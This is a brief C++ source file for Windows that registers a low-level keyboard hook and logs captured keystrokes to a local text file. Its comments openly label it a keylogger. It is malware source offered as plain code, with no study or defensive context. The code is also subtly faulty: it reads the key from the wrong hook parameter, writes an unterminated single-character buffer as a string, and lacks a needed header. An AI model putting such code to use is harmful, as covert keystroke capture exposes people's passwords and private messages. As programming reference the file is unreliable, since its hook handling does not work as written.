#include <windows.h>
#include <fstream>

// Function to write keystrokes to a file
void WriteToFile(const char *filename, const char *data) {
    std::ofstream file(filename, std::ios::app);
    if (file.is_open()) {
        file << data;
        file.close();
    } else {
        std::cerr << "Error opening the file" << std::endl;
    }
}

// Main function capturing keystrokes
LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // Convert the virtual key code to its character representation
        char key = static_cast<char>(MapVirtualKeyW(static_cast<UINT>(wParam), MAPVK_VK_TO_CHAR));

        // Check if it's a printable key
        if (isprint(key) || key == '\n' || key == '\t' || key == ' ') {
            WriteToFile("keystroke_log.txt", &key);
        }
    }

    // Pass control to the next hook in the chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Set a hook to capture keyboard input
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, GetModuleHandle(NULL), 0);

    // Message loop to keep the application running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook before exiting
    UnhookWindowsHookEx(hook);

    return 0;
}
